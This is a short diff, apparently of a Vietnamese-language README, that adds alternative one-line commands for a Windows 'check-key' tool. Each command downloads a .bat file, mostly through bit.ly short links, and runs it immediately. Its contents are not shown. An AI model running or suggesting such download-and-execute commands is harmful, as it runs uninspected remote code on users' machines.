@@ -3,6 +3,11 @@
 ````Bash
 curl -fsSL https://raw.githubusercontent.com/longnguyen2026/check-key/main/check-key.bat -o "%TEMP%\check-key.bat" && call "%TEMP%\check-key.bat"
 ````
+Hoặc
 ````Bash
-curl -fsSL https://bit.ly/CheckKey -o "%TEMP%\Check-Key.bat" && call "%TEMP%\Check-Key.bat"
+curl -L https://bit.ly/4h01qsh -o %temp%\c.bat&call %temp%\c.bat
+````
+Hoặc
+````Bash
+curl -fsSL https://bit.ly/4h01qsh -o "%TEMP%\check-key.bat" && call "%TEMP%\check-key.bat"
 ````
